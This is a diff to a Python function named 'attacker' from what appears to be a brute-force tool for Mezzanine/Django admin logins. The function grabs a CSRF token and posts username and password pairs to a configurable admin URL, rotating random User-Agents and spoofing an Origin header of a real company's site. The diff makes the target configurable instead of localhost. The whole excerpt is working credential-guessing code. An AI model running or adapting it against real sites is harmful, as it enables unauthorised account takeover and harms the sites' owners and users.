@@ -39,25 +39,25 @@ def interval(config):
 
 
 def attacker(user, pass_, config):
-    useragent = config.get('http_headers', 'useragent')
+    useragent = config.get('http_headers', 'User-Agent')
     if useragent == "random":
         useragent = ua.random
 
     cookie = acccess({
         'method': 'GET',
-        'url': 'http://127.0.0.1:8000/admin',
+        'url': config.get('general', 'url'),
         'headers': {
-            'useragent': useragent,
-            'cookie': '',
-            'referer': '',
-            'accept': config.get('http_headers', 'accept'),
-            'accept-encoding': 'gzip, deflate, br',
-            'accept_language': config.get('http_headers', 'accept_language'),
-            'content-type': 'application/x-www-form-urlencoded',
-            'connection': 'keep-alive',
-            'origin': 'http://point.recruit.co.jp',
-            'cache-control': 'no-cache',
-            'upgrade-insecure-requests': '1',
+            'User-Agent': useragent,
+            'Cookie': '',
+            'Referer': '',
+            'Accept': config.get('http_headers', 'accept'),
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept_Language': config.get('http_headers', 'accept_language'),
+            'Content-Type': 'text/html; charset=utf-8',
+            'Connection': 'keep-alive',
+            'Origin': 'http://point.recruit.co.jp',
+            'Cache-Control': 'no-cache',
+            'Upgrade-Insecure-Requests': '1',
         },
     }).cookies['csrftoken']
     interval(config)
@@ -68,17 +68,17 @@ def attacker(user, pass_, config):
         'querystring': {'next': '/ja/admin'},
         'payload': 'username={}&password={}&this_is_the_login_form=1&mezzanine_login_interface=admin&csrfmiddlewaretoken={}'.format(user, pass_, cookie),
         'headers': {
-            'useragent': useragent,
-            'cookie': 'csrftoken={}'.format(cookie),
-            'referer': config.get('http_headers', 'referer'),
-            'accept': config.get('http_headers', 'accept'),
-            'accept-encoding': 'gzip, deflate, br',
-            'accept_language': config.get('http_headers', 'accept_language'),
-            'content-type': 'application/x-www-form-urlencoded',
-            'connection': 'keep-alive',
-            'origin': 'http://point.recruit.co.jp',
-            'cache-control': 'no-cache',
-            'upgrade-insecure-requests': '1',
+            'User-Agent': useragent,
+            'Cookie': 'csrftoken={}'.format(cookie),
+            'Referer': config.get('http_headers', 'referer'),
+            'Accept': config.get('http_headers', 'accept'),
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept_Language': config.get('http_headers', 'accept_language'),
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Connection': 'keep-alive',
+            'Origin': 'http://point.recruit.co.jp',
+            'Cache-Control': 'no-cache',
+            'Upgrade-Insecure-Requests': '1',
         },
     })
     if res is not None:
